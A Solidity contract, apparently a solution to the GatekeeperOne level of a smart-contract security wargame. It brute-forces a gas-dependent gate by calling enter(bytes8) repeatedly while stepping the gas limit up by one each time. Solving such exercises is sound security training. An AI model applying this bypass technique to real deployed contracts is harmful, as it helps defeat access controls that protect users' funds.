// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "../interfaces/IGatekeeperOne.sol";

contract GatekeeperOneExploit {
    IGatekeeperOne gatekeeper;

    constructor(IGatekeeperOne _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function exploit(bytes8 _gateKey, uint256 initialGasLimit)
        external
        returns (bool success)
    {
        success = false;

        for (
            uint256 extraGasLimit = 0;
            !success && extraGasLimit < 1000;
            extraGasLimit++
        ) {
            (success, ) = address(gatekeeper).call{
                gas: initialGasLimit + extraGasLimit
            }(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        }
    }
}
